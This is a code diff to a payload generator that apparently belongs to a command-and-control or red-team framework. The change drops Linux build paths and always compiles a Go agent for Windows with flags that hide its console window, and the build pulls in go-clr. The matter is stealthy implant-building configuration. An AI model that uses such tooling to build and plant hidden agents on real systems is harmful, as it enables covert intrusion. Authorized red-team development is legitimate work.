@@ -762,10 +762,7 @@ class PayloadGenerator:
 
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         safe_listener_name = "go_agent"  # We'll use a generic name since we don't have listener_name here
-        if platform.lower() == 'linux':
-            exe_filename = f"go_agent_{agent_id[:8]}_{timestamp}"
-        else:
-            exe_filename = f"go_agent_{agent_id[:8]}_{timestamp}.exe"
+        exe_filename = f"go_agent_{agent_id[:8]}_{timestamp}.exe"
         final_exe_path = os.path.join(logs_dir, exe_filename)
 
         with tempfile.TemporaryDirectory() as temp_dir:
@@ -815,25 +812,17 @@ class PayloadGenerator:
             if result.returncode != 0:
                 raise Exception(f"Failed to get go-clr dependency: {result.stderr}")
 
-            if platform.lower() == 'linux':
-                output_filename = 'agent'
-                temp_exe_path = os.path.join(temp_dir, 'agent')
-            else:
-                output_filename = 'agent.exe'
-                temp_exe_path = os.path.join(temp_dir, 'agent.exe')
+            output_filename = 'agent.exe'
+            temp_exe_path = os.path.join(temp_dir, 'agent.exe')
 
             try:
                 env = go_env.copy()  # Use the same Go cache environment
-                if platform.lower() == 'linux':
-                    env['GOOS'] = 'linux'
-                else:
-                    env['GOOS'] = 'windows'
+                env['GOOS'] = 'windows'
                 env['GOARCH'] = 'amd64'
 
                 # For Windows builds, use GUI application flag to prevent console window allocation
                 ldflags = ['-s', '-w']
-                if platform.lower() != 'linux':
-                    ldflags.extend(['-H', 'windowsgui'])  # Create GUI application without console window
+                ldflags.extend(['-H', 'windowsgui'])  # Create GUI application without console window
 
                 result = subprocess.run([
                     'go', 'build',
